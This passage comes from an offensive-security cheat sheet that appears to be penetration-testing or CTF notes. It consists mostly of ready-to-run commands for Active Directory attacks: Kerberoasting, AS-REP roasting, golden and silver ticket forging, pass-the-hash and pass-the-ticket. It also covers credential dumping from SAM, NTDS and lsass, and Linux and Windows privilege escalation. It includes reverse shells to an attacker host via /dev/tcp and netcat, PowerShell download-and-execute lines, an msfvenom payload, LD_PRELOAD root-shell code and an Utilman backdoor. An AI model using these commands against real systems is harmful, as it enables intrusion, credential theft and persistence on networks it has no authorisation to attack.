bloodhound-python -d <DOMAIN> -u <USERNAME> -p "<PASSWORD>" -gc <DOMAIN> -c all -ns <RHOST>
bloodhound-python -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -ns <RHOST> -c All
bloodhound-python -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -dc <RHOST> -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
```

#### Certify

> https://github.com/GhostPack/Certify

```c
.\Certify find /vulnerable
.\Certify.exe find /vulnerable /currentuser
```

#### Certipy

> https://github.com/ly4k/Certipy

> https://github.com/ly4k/BloodHound/

```c
certipy find -dc-ip <RHOST> -u <USERNAME>@<DOMAIN> -p <PASSWORD>
```

##### Account Creation

```c
certipy account create -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -dns <DOMAIN_CONTROLLER_DNS_NAME> -user <COMPUTERNAME>
```

##### Authentication

```c
certipy auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN>
```

###### LDAP-Shell

```c
certipy auth -pfx <FILE>.pfx -dc-ip <RHOST> -u <USERNAME> -domain <DOMAIN> -ldap-shell
```

```c
# add_user <USERNAME>
# add_user_to_group <GROUP>
```

##### Certificate Forging

```c
certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template Web -dc-ip <RHOST> -save-old
```

##### Certificate Request

Run the following command twice because of a current issue with `certipy`.

```c
certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST>
```

```c
certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST> -upn <USERNAME>@<DOMAIN> -dns <FQDN>
certipy req -username <USERNAME>@<DOMAIN> -password <PASSWORD> -ca <CA> -target <FQDN> -template <TEMPLATE> -dc-ip <RHOST> -upn <USERNAME>@<DOMAIN> -dns <FQDN> -debug
```

##### Revert Changes

```c
certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLATE> -dc-ip <RHOST> -configuration <TEMPLATE>.json
```

##### Start BloodHound Fork

```c
./BloodHound --disable-gpu-sandbox
```

#### enum4linux-ng

```c
enum4linux-ng -A <RHOST>
```

#### Evil-WinRM

```c
evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>
evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIVATE/KEY/<KEY>.key -p -u -S
```

#### Impacket

```c
impacket-smbserver local . -smb2support
impacket-reg <DOMAIN>/<USERNAME>:<PASSWORD:PASSWORD_HASH>@<RHOST> <ACTION> <ACTION>
impacket-services <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <ACTION>
impacket-netview <DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt
impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
impacket-GetADUsers -all -dc-ip <RHOST> <DOMAIN>/
impacket-getST <DOMAIN>/<USERNAME>$  -spn WWW/<DOMAIN_CONTROLLER>.<DOMAIN> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
impacket-rpcdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
impacket-samrdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
impacket-atexec -k -no-pass <DOMAIN>/Administrator@<DOMAIN_CONTROLLER>.<DOMAIN> 'type C:\PATH\TO\FILE\<FILE>'
```

##### impacket-smbclient

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-smbclient <RHOST>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
impacket-smbclient -k <RHOST>/<USERNAME>@<RHOST>.<RHOST> -no-pass
```

##### impacket-getTGT

```c
impacket-getTGT <RHOST>/<USERNAME>:<PASSWORD>
impacket-getTGT <RHOST>/<USERNAME> -dc-ip <RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
```

##### impacket-GetNPUsers

```c
impacket-GetNPUsers <RHOST>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
impacket-GetNPUsers <RHOST>/<USERNAME> -request -no-pass -dc-ip <RHOST>
impacket-GetNPUsers <RHOST>/ -usersfile usernames.txt -format john -outputfile hashes
```

##### impacket-getUserSPNs / GetUserSPNs.py

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-GetUserSPNs <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<RHOST> -no-pass -request
./GetUserSPNs.py <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<RHOST> -no-pass -request
```

##### impacket-secretsdump

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-secretsdump <RHOST>/<USERNAME>@<RHOST>
impacket-secretsdump -k <RHOST>/<USERNAME>@<RHOST>.<RHOST> -no-pass -debug
impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
impacket-secretsdump -dc-ip <RHOST> <RHOST>.LOCAL/svc_bes:<PASSWORD>@<RHOST>
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```

##### impacket-psexec

```c
impacket-psexec <USERNAME>@<RHOST>
impacket-psexec <RHOST>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
```

##### impacket-ticketer

###### Requirements

* Valid User
* NTHASH
* Domain-SID

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain <RHOST> -spn MSSQLSVC/<RHOST>.<RHOST> -user-id 500 Administrator
```

##### Fixing [-] exceptions must derive from BaseException

###### Issue

```c
./GetUserSPNs.py <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <DOMAIN_CONTROLLER>.<RHOST> -no-pass -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] exceptions must derive from BaseException
```

###### How to fix it

```c
241         if self.__doKerberos:
242             #target = self.getMachineName()
243             target = self.__kdcHost
```

##### dacledit.py

> https://github.com/fortra/impacket/blob/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py

```c
$ python3 dacledit.py <DOMAIN>/<USERNAME>:<PASSWORD> -k -target-dn 'DC=<DOMAIN>,DC=<DOMAIN>' -dc-ip <RHOST> -action read -principal '<USERNAME>' -target '<GROUP>' -debug
```

###### Fixing msada_guids Error

```c
#from impacket.msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
from msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS
```

Then put the `msada_guids.py` into the same directory as `dacledit.py`

> https://github.com/Porchetta-Industries/CrackMapExec/blob/master/cme/helpers/msada_guids.py

##### owneredit.py

> https://github.com/fortra/impacket/blob/5c477e71a60e3cc434ebc0fcc374d6d108f58f41/examples/owneredit.py

```c
$ python3 owneredit.py -k '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <RHOST> -action write -new-owner '<USERNAME>' -target '<GROUP>' -debug
```

#### JAWS

```c
IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.ps1')
```

#### Kerberos

> https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

##### General Notes

- Golden Ticket is a Ticket Granting Ticket (TGT) and completely forged offline (KRBTGT Account Hash needed).
- Silver Ticket is a forged service authentication ticket (Service Principal Name (SPN) and Machine Account Keys (Hash in RC4 or AES) needed). Silver Tickets do not touch the Domain Controller (DC).
- Diamond Ticket is essentially a Golden Ticket but requested from a Domain Controller (DC).

##### Bruteforce

```c
./kerbrute -domain <DOMAIN> -users <FILE> -passwords <FILE> -outputfile <FILE>
```

###### With List of Users

```c
.\Rubeus.exe brute /users:<FILE> /passwords:<FILE> /domain:<DOMAIN> /outfile:<FILE>
```

###### Check Passwords for all Users in Domain

```c
.\Rubeus.exe brute /passwords:<FILE> /outfile:<FILE>
```

##### ASPREPRoast

###### Check ASPREPRoast for all Domain Users (Credentials required)

```c
impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format hashcat -outputfile <FILE>
impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format john -outputfile <FILE>
```

###### Check ASPREPRoast for a List of Users (No Credentials required)

```c
impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format hashcat -outputfile <FILE>
impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format john -outputfile <FILE>
```

###### Check ASPREPRoast for all Domain Users in Domain

```c
.\Rubeus.exe asreproast  /format:hashcat /outfile:<FILE>
```

##### Kerberoasting

```c
python GetUserSPNs.py <DOMAIN>/<USERNAME>:<PASSWORD> -outputfile <FILE>
.\Rubeus.exe kerberoast /outfile:<FILE>
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
```

##### Overpass The Hash/Pass The Key (PTK)

###### Request TGT with Hash

```c
impacket-getTGT <DOMAIN>/<USERNAME> -hashes <LMHASH>:<NTLMHASH>
```

###### Request TGT with aesKey (More secure Encryption, probably more stealth due is it used by Default)

```c
impacket-getTGT <DOMAIN>/<USERNAME> -aesKey <KEY>
```

###### Request TGT with Password

```c
impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
```

###### Set TGT for Impacket Usage

```c
export KRB5CCNAME=<USERNAME>.ccache
```

###### Execute Remote Commands

```c
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

###### Ask and inject the Ticket

```c
.\Rubeus.exe asktgt /domain:<DOMAIN> /user:<USERNAME> /rc4:<NTLMHASH> /ptt
```

###### Execute a CMD on Remote Host

```c
.\PsExec.exe -accepteula \\<RHOST> cmd
```

##### Pass The Ticket (PTT)

###### Harvest Tickets from Linux

###### Check Type and Location of Tickets

```c
grep default_ccache_name /etc/krb5.conf
```

* If none return, default is FILE:/tmp/krb5cc_%{uid}
* In Case of File Tickets it is possible to Copy-Paste them to use them
* In Case of being KEYRING Tickets, the Tool tickey can be used to get them
* To dump User Tickets, if root, it is recommended to dump them all by injecting in other user processes
* To inject, the Ticket have to be copied in a reachable Folder by all Users

```c
cp tickey /tmp/tickey
/tmp/tickey -i
```

###### Harvest Tickets from Windows

```c
mimikatz # sekurlsa::tickets /export
.\Rubeus dump
```

###### Convert Tickets dumped with Rubeus into base64

```c
[IO.File]::WriteAllBytes("<TICKET>.kirbi", [Convert]::FromBase64String("<TICKET>"))
```

###### Convert Tickets between Linux and Windows Format with ticket_converter.py

> https://github.com/Zer1t0/ticket_converter

```c
python ticket_converter.py ticket.kirbi ticket.ccache
python ticket_converter.py ticket.ccache ticket.kirbi
```

###### Using Ticket on Linux

```c
export KRB5CCNAME=<USERNAME>.ccache
```

###### Execute Remote Commands by using TGT

```c
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

###### Using Ticket on Windows

###### Inject Ticket with mimikatz

```c
mimikatz # kerberos::ptt <KIRBI_FILE>
```

###### Inject Ticket with Rubeus

```c
.\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```

###### Execute a CMD on Remote Host

```c
.\PsExec.exe -accepteula \\<RHOST> cmd
```

##### Silver Ticket

###### Impacket Examples

###### Generate TGS with NTLM

```c
python ticketer.py -nthash <NTLMHASH> -domain-sid <SID> -domain <DOMAIN> -spn <SPN>  <USERNAME>
```

###### Generate TGS with aesKey

```c
python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN> -spn <SPN>  <USERNAME>
```

###### Set the ticket for impacket use

```c
export KRB5CCNAME=<USERNAME>.ccache
```

###### Execute Remote Commands by using TGT

```c
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

##### mimikatz Examples

###### Generate TGS with NTLM

```c
mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<NTLMHASH> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```

###### Generate TGS with AES 128bit Key

```c
mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```

###### Generate TGS with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)

```c
mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```

###### Inject TGS with Mimikatz

```c
mimikatz # kerberos::ptt <KIRBI_FILE>
```

##### Rubeus Examples

```c
.\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```

###### Execute CMD on Remote Host

```c
.\PsExec.exe -accepteula \\<RHOST> cmd
```

##### Golden Ticket

###### Impacket Examples

###### Generate TGT with NTLM

```c
python ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid <SID> -domain <DOMAIN>  <USERNAME>
```

###### Generate TGT with aesKey

```c
python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN>  <USERNAME>
```

###### Set TGT for Impacket Usage

```c
export KRB5CCNAME=<USERNAME>.ccache
```

###### Execute Remote Commands by using TGT

```c
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

##### mimikatz Examples

###### Generate TGT with NTLM

```c
mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<KRBTGT_NTLM_HASH> /user:<USERNAME>
```

###### Generate TGT with AES 128bit Key

```c
mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME>
```

###### Generate TGT with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)

```c
mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME>
```

###### Inject TGT with Mimikatz

```c
mimikatz # kerberos::ptt <KIRBI_FILE>
```

##### Rubeus Examples

###### Inject Ticket with Rubeus

```c
.\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```

###### Execute CMD on Remote Host

```c
.\PsExec.exe -accepteula \\<RHOST> cmd
```

###### Get NTLM from Password

```c
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<PASSWORD>".encode("utf-16le")).digest())'
```

#### ldapsearch

```c
ldapsearch -x -w <PASSWORD>
ldapsearch -x -h <RHOST> -s base namingcontexts
ldapsearch -x -b "dc=<RHOST>,dc=local" "*" -h <RHOST> | awk '/dn: / {print $2}'
ldapsearch -x -D "cn=admin,dc=<RHOST>,dc=local" -s sub "cn=*" -h <RHOST> | awk '/uid: /{print $2}' | nl
ldapsearch -D "cn=admin,dc=acme,dc=com" "(objectClass=*)" -w ldapadmin -h ldap.acme.com
ldapsearch -x -h <RHOST> -D "<USERNAME>"  -b "dc=<RHOST>,dc=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
ldapsearch -H ldap://<DOMAIN> -b "DC=<DOMAIN>,DC=local" > <FILE>.txt
```

#### Linux

##### Basic Linux Enumeration

```c
id
sudo -l
uname -a
cat /etc/hosts
cat /etc/fstab
cat /etc/passwd
ss -tulpn
ps -auxf
ls -lahv
ls -R /home
ls -la /opt
```

##### find Commands

###### Specific Size

```c
find / -size 50M    // find files with a size of 50MB
```

###### Modified Files

```c
find / -mtime 10    // find modified files in the last 10 days
find / -atime 10    // find accessed files in the last 10 days
find / -cmin -60    // find files changed within the last 60 minutes
find / -amin -60    // find files accesses within the last 60 minutes
```

###### Passwords

```c
find ./ -type f -exec grep --color=always -i -I 'password' {} \;
```

###### Group Permissions

```c
find / -group <group> 2>/dev/null
```

###### User specific Files

```c
find / -user <USERNAME> 2>/dev/null
find / -user <USERNAME> -ls 2>/dev/null
find / -user <USERNAME> 2>/dev/null | grep -v proc 2>/dev/null
find / -user <USERNAME> -ls 2>/dev/null | grep -v proc 2>/dev/null
```

###### SUID and SGID Files

```c
find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null | xargs ls -la
find / -type f -user root -perm -4000 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

##### grep for Passwords

```c
grep -R db_passwd
grep -roiE "password.{20}"
grep -oiE "password.{20}" /etc/*.conf
grep -v "^[#;]" /PATH/TO/FILE | grep -v "^$"    // grep for passwords like "DBPassword:"
```

##### Apache2

###### Read first Line of a File with apache2 Binary

```c
sudo /usr/sbin/apache2 -f <FILE>
```

##### Bash Debugging Mode

- Bash <4.4

```c
env -i SHELLOPTS=xtrace PS4='$(chmod +s /bin/bash)' /usr/local/bin/<BINARY>
```

##### Bash Functions

- Bash <4.2-048

```c
function /usr/sbin/<BINARY> { /bin/bash -p; }
export -f /usr/sbin/<BINARY>
/usr/sbin/<BINARY>
```

##### LD_PRELOAD

> https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

###### shell.c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

or

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

###### Compiling

```c
gcc -o <SHARED_OBJECT>.so <FILE>.c -shared -FPIC -nostartfiles 
```

###### Privilege Escalation

```c
sudo LD_PRELOAD=/PATH/TO/SHARED_OBJECT/<SHARED_OBJECT>.so <BINARY>
```

##### LD_LIBRARY_PATH

###### Get Information about Libraries

```c
ldd /PATH/TO/BINARY/<BINARY>
```

###### shell.c

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

###### Compiling

```c
gcc -o <LIBRARY>.so.<NUMBER> -shared -fPIC <FILE>.c
```

###### Privilege Escalation

```c
sudo LD_LIBRARY_PATH=/PATH/TO/LIBRARY/<LIBRARY>.so.<NUMBER> <BINARY>
```

##### logrotten

> https://github.com/whotwagner/logrotten

```c
if [ `id -u` -eq 0 ]; then ( /bin/sh -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 ); fi
```

###### If "create"-option is set in logrotate.cfg

```c
./logrotten -p ./payloadfile /tmp/log/pwnme.log
```

###### If "compress"-option is set in logrotate.cfg

```c
./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
```

##### Path Variable Hijacking

```c
find / -perm -u=s -type f 2>/dev/null
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
export PATH=$(pwd):$PATH
```

##### Wildcards

> https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt

With the command `touch -- --checkpoint=1` will be a file created. Why? Because the `--` behind the command `touch` is telling touch, that there's option to be wait for. 
Instead of an option, it creates a file, named `--checkpoint=1`.

```c
touch -- --checkpoint=1
```

or

```c
touch ./--checkpoint=1
```

So after creating the `--checkpoint=1` file, i created another file, which executes a shell script.

```c
touch -- '--checkpoint-action=exec=sh shell.sh'
```

or 

```c
touch ./--checkpoint-action=exec=<FILE>
```

To delete a misconfigured file, put a `./` in front of it.

```c
rm ./'--checkpoint-action=exec=python script.sh'
```

##### Writeable Directories in Linux

```c
/dev/shm
/tmp
```

#### Microsoft Windows

##### Basic Windows Enumeration

```c
systeminfo
whoami /all
net users
net users <USERNAME>
tasklist /SVC
sc query
sc qc <SERVICE>
netsh firewall show state
schtasks /query /fo LIST /v
findstr /si password *.xml *.ini *.txt
dir /s *pass* == *cred* == *vnc* == *.config*
accesschk.exe -uws "Everyone" "C:\Program Files\"
wmic qfe get Caption,Description,HotFixID,InstalledOn
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
```

##### AppLocker Bypass List

```
Bypass List (Windows 10 Build 1803):
C:\Windows\Tasks
C:\Windows\Temp
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

##### accesschk

###### Checking File Permissions

```c
.\accesschk.exe /accepteula -quvw "C:\PATH\TO\FILE\<FILE>.exe"
```

###### Checking Service Permissions

```c
.\accesschk.exe /accepteula -uwcqv <USERNAME> daclsvc
```

###### Checking Path Permissions to find Unquoted Service Paths

```c
.\accesschk.exe /accepteula -uwdq C:\
.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
.\accesschk.exe /accepteula -uwdq "C:\Program Files\<UNQUOTED_SERVICE_PATH>"
```

###### Checking Registry Entries

```c
.\accesschk.exe /accepteula -uvwqk <REGISTRY_KEY>
```

##### Adding Users to Groups

```c
net user <USERNAME> <PASSWORD> /add /domain
net group "Exchange Windows Permissions" /add <USERNAME>
net localgroup "Remote Management Users" /add <USERNAME>
```

##### Enable Remote Desktop (RDP)

```c
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=yes
```

##### Privileges and Permissions

###### AlwaysInstallElevated

```c
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

```c
$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<LHOST> lport=<LPORT> –f  msi > <FILE>.msi
```

```c
msiexec /quiet /qn /i <FILE>.msi
```

###### SeBackup and SeRestore Privilege

###### Backup SAM and SYSTEM Hashes

```c
reg save hklm\system C:\Users\<USERNAME>\system.hive
reg save hklm\sam C:\Users\<USERNAME>\sam.hive
```

###### Dumping Hashes

```c
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

###### SeBackupPrivilege Privilege Escalation (diskshadow)

> https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug

###### Script for PowerShell Environment

```c
SET CONTEXT PERSISTENT NOWRITERSp
add volume c: alias foobarp
createp
expose %foobar% z:p
```

```c
diskshadow /s <FILE>.txt
```

###### Copy ntds.dit

```c
Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
```

###### Export System Registry Value

```c
reg save HKLM\SYSTEM c:\temp\system
```

Download `ndts.dit` and system and get the hashes from `secretsdump.py` of the impacket-suite.

###### SeTakeOwnership Privilege

```c
takeown /f C:\Windows\System32\Utilman.exe
```

```c
icacls C:\Windows\System32\Utilman.exe /grant Everyone:F
```

```c
C:\Windows\System32\> copy cmd.exe utilman.exe
```

Click the `Ease of Access` button on the logon screen to get a shell with `NT Authority\System` privileges.

###### SeImpersonate and SeAssignPrimaryToken Privilege

> https://github.com/antonioCoco/RogueWinRM

```c
.\RogueWinRM.exe -p "C:\> .\nc64.exe" -a "-e cmd.exe <LHOST> <LPORT>"
```

##### Registry Handling

###### Enable Colored Output

```c
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

Then open a new Terminal Window.

###### Check for Auto Run Programs

```c
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

###### Get Registry Key Information

```c
req query <REGISTRY_KEY>
```

###### Modify Registry Key

```c
reg add <REGISTRY_KEY> /v <VALUE_TO_MODIFY> /t REG_EXPAND_SZ /d C:\PATH\TO\FILE\<FILE>.exe /f
```

##### Searching for Credentials

###### Quick Wins

> https://twitter.com/NinjaParanoid/status/1516442028963659777?t=g7ed0vt6ER8nS75qd-g0sQ&s=09

> https://www.nirsoft.net/utils/credentials_file_view.html

```c
cmdkey /list
rundll32 keymgr.dll, KRShowKeyMgr
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
```

###### Search for Passwords

```c
dir .s *pass* == *.config
findstr /si password *.xml *.ini *.txt
```

###### PowerShell History

```c
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

###### Saved Windows Credentials

```c
cmdkey /list
runas /savecred /user:<USERNAME> cmd.exe
```

###### Search the Registry for Passwords

```c
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

###### Dumping Credentials

```c
reg save hklm\system system
reg save hklm\sam sam
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\security c:\temp\security.save
reg.exe save hklm\system c:\temp\system.save
```

###### Internet Information Service (IIS)

```c
C:\Windows\System32\inetsrv>appcmd.exe list apppool /@:*
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

###### PuTTY

```c
reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
```

###### Lsass

```c
tasklist
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 688 C:\Users\Administrator\Documents\lsass.dmp full
```

###### Unattended Windows Installations

```c
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

##### Insecure Service Permissions

```c
accesschk64.exe -qlc <SERVICE>
icacls C:\Users\<USERNAME>\<FILE>.exe /grant Everyone:F
sc config <SERVICE> binPath= "C:\Users\<USERNAME>\<FILE>.exe" obj= LocalSystem
sc stop <SERVICE>
sc start <SERVICE>
```

##### Service Handling

```c
sc create <SERVICE_NAME>
sc start <SERVICE_NAME>
sc qc <SERVICE_NAME>
```

##### Scheduled Tasks

```c
schtasks
schtasks /query /tn <TASK> /fo list /v
schtasks /run /tn <TASK>
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

##### Unquoted Service Paths

Search for `Unquoted Service Paths` by using `sc qc`.

```c
sc qc
sc qc <SERVICE>
sc stop <SERVICE>
sc start <SERVICE>
```

```c
icacls <PROGRAM>.exe
icacls C:\PROGRA~2\SYSTEM~1\<SERVICE>.exe
icacls C:\PROGRA~2\SYSTEM~1\<SERVICE>.exe /grant Everyone:F
```

##### writeDACL

> https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/

```c
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DCSync
```

##### WMIC

```c
wmic product get name,version,vendor
wmic qfe get Caption,Description,HotFixID,InstalledOn    # no new patches - KEXP pretty likely
```

#### PKINITtools

```c
python3 gettgtpkinit.py -cert-pfx <USERNAME>.pfx -dc-ip <RHOST> <DOMAIN>/<USERNAME> <USERNAME>.ccache
export KRB5CCNAME=<USERNAME>.ccache
python3 getnthash.py <DOMAIN>/<USERNAME> -key 6617cde50b7ee63faeb6790e84981c746efa66f68a1cc3a394bbd27dceaf0554
```

#### Port Scanning

```c
$ export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
```

#### powercat

```c
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e cmd"
```

#### PowerShell

##### Common Commands

```c
whoami /all
getuserid
systeminfo
Get-Process
net users
net users <USERNAME>
Get-ADUser -Filter * -SearchBase "DC=<DOMAIN>,DC=LOCAL"
Get-Content <FILE>
Get-ChildItem . -Force
GCI -hidden
type <FILE> | findstr /l <STRING>
[convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
```

##### Allow Script Execution

```c
Set-ExecutionPolicy remotesigned
Set-ExecutionPolicy unrestricted
```

##### Script Execution Bypass

```c
